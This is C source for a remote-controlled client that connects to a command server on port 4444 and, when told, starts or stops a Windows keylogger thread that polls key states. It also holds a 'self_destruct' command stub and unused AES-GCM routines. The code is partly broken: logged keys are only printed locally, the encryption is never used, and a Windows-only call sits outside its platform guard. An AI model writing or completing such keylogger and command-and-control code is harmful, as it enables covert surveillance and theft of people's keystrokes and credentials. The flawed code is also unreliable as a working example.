#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <openssl/aes.h>
#include <openssl/rand.h>
#include <openssl/evp.h>

#ifdef _WIN32
#include <windows.h>
#endif

#define DEFAULT_IP "127.0.0.1"
#define DEFAULT_PORT 4444
#define AES_KEY_SIZE 256
#define BUFFER_SIZE 1024
#define RECONNECT_DELAY 5
#define MAX_RETRIES 5

// Global Variables
int keylogger_active = 0;
int sock = 0;
unsigned char aes_key[AES_KEY_SIZE / 8];
unsigned char iv[12];
pthread_t keylogger_thread;

// AES-GCM encryption function
void aes_gcm_encrypt(const unsigned char *plaintext, int plaintext_len, const unsigned char *key,
                     const unsigned char *iv, unsigned char *ciphertext, unsigned char *tag) {
    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    if (!ctx) {
        perror("Failed to create context for encryption");
        exit(EXIT_FAILURE);
    }

    if (EVP_EncryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, NULL, NULL) != 1) {
        perror("Failed to initialize AES-GCM encryption");
        EVP_CIPHER_CTX_free(ctx);
        exit(EXIT_FAILURE);
    }

    if (EVP_EncryptInit_ex(ctx, NULL, NULL, key, iv) != 1) {
        perror("Failed to set AES-GCM key and IV");
        EVP_CIPHER_CTX_free(ctx);
        exit(EXIT_FAILURE);
    }

    int len;
    if (EVP_EncryptUpdate(ctx, ciphertext, &len, plaintext, plaintext_len) != 1) {
        perror("Failed to encrypt data");
        EVP_CIPHER_CTX_free(ctx);
        exit(EXIT_FAILURE);
    }

    if (EVP_EncryptFinal_ex(ctx, ciphertext + len, &len) != 1) {
        perror("Failed to finalize encryption");
        EVP_CIPHER_CTX_free(ctx);
        exit(EXIT_FAILURE);
    }

    if (EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_GET_TAG, 16, tag) != 1) {
        perror("Failed to get AES-GCM tag");
        EVP_CIPHER_CTX_free(ctx);
        exit(EXIT_FAILURE);
    }

    EVP_CIPHER_CTX_free(ctx);
}

// AES-GCM decryption function
void aes_gcm_decrypt(const unsigned char *ciphertext, int ciphertext_len, const unsigned char *key,
                     const unsigned char *iv, const unsigned char *tag, unsigned char *plaintext) {
    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    if (!ctx) {
        perror("Failed to create context for decryption");
        exit(EXIT_FAILURE);
    }

    if (EVP_DecryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, NULL, NULL) != 1) {
        perror("Failed to initialize AES-GCM decryption");
        EVP_CIPHER_CTX_free(ctx);
        exit(EXIT_FAILURE);
    }

    if (EVP_DecryptInit_ex(ctx, NULL, NULL, key, iv) != 1) {
        perror("Failed to set AES-GCM key and IV");
        EVP_CIPHER_CTX_free(ctx);
        exit(EXIT_FAILURE);
    }

    int len;
    if (EVP_DecryptUpdate(ctx, plaintext, &len, ciphertext, ciphertext_len) != 1) {
        perror("Failed to decrypt data");
        EVP_CIPHER_CTX_free(ctx);
        exit(EXIT_FAILURE);
    }

    if (EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_TAG, 16, (void *)tag) != 1) {
        perror("Failed to set AES-GCM tag");
        EVP_CIPHER_CTX_free(ctx);
        exit(EXIT_FAILURE);
    }

    if (EVP_DecryptFinal_ex(ctx, plaintext + len, &len) <= 0) {
        perror("Decryption failed");
        EVP_CIPHER_CTX_free(ctx);
        exit(EXIT_FAILURE);
    }

    EVP_CIPHER_CTX_free(ctx);
}

// Keylogger thread function
void *keylogger_start(void *arg) {
    while (keylogger_active) {
        // Windows-only keylogger
        #ifdef _WIN32
        for (int i = 8; i <= 255; i++) {
            if (GetAsyncKeyState(i) & 0x0001) {
                printf("Key Pressed: %c\n", i);
            }
        }
        #endif
        Sleep(10);
    }
    return NULL;
}

// Start keylogger
void start_keylogger() {
    keylogger_active = 1;
    if (pthread_create(&keylogger_thread, NULL, keylogger_start, NULL) != 0) {
        perror("Failed to create keylogger thread");
        exit(EXIT_FAILURE);
    }
}

// Stop keylogger
void stop_keylogger() {
    keylogger_active = 0;
    pthread_join(keylogger_thread, NULL);
}

// Reconnection logic with exponential backoff
void reconnect() {
    int attempt = 0;
    while (attempt < MAX_RETRIES) {
        printf("Attempting to reconnect (%d/%d)...\n", attempt + 1, MAX_RETRIES);
        
        if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
            perror("Socket creation error");
            sleep(RECONNECT_DELAY * (attempt + 1)); // Exponential backoff
            attempt++;
            continue;
        }

        struct sockaddr_in serv_addr;
        serv_addr.sin_family = AF_INET;
        serv_addr.sin_port = htons(DEFAULT_PORT);

        if (inet_pton(AF_INET, DEFAULT_IP, &serv_addr.sin_addr) <= 0) {
            perror("Invalid address");
            close(sock);
            sleep(RECONNECT_DELAY * (attempt + 1)); // Exponential backoff
            attempt++;
            continue;
        }

        if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) == 0) {
            printf("Reconnected successfully\n");
            return;
        }

        perror("Reconnection attempt failed");
        close(sock);
        sleep(RECONNECT_DELAY * (attempt + 1)); // Exponential backoff
        attempt++;
    }

    printf("Failed to reconnect after %d attempts. Exiting...\n", MAX_RETRIES);
    exit(EXIT_FAILURE);
}

// Main client logic
void client_run() {
    unsigned char command[BUFFER_SIZE];
    memset(command, 0, sizeof(command));

    while (1) {
        if (recv(sock, command, sizeof(command), 0) <= 0) {
            reconnect();
            continue;
        }

        if (strncmp((char *)command, "self_destruct", 13) == 0) {
            // Self-destruct logic here
        } else if (strncmp((char *)command, "start_keylogger", 15) == 0) {
            start_keylogger();
        } else if (strncmp((char *)command, "stop_keylogger", 14) == 0) {
            stop_keylogger();
        } else if (strncmp((char *)command, "exit", 4) == 0) {
            stop_keylogger();
            break;
        }
    }

    close(sock);
}

int main(int argc, char *argv[]) {
    // Seed OpenSSL randomness
    RAND_bytes(aes_key, sizeof(aes_key));
    RAND_bytes(iv, sizeof(iv));

    // Initialize socket
    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        perror("Socket creation error");
        return EXIT_FAILURE;
    }

    struct sockaddr_in serv_addr;
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(DEFAULT_PORT);

    if (inet_pton(AF_INET, DEFAULT_IP, &serv_addr.sin_addr) <= 0) {
        perror("Invalid address");
        return EXIT_FAILURE;
    }

    // Connect to server
    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
        perror("Connection failed");
        reconnect();
    }

    printf("Connected to server.\n");
    client_run();

    return 0;
}
